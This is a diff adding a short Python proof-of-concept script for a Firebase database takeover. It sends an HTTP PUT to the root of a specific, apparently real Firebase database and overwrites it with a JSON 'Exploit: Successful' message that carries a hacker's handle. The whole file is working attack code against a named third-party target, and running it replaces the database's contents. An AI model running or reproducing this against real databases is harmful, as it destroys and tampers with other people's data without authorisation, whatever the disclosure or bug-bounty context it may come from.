@@ -1,0 +1,5 @@
+#!/usr/bin/python3
+import requests
+data = '{ "Exploit": "Successful", "HACKER_NAME": "me_dheeraj", "POC": "firebase database takeover" }'
+response = requests.put('https://prepladder-project.firebaseio.com/.json', data=data)
+print(response)
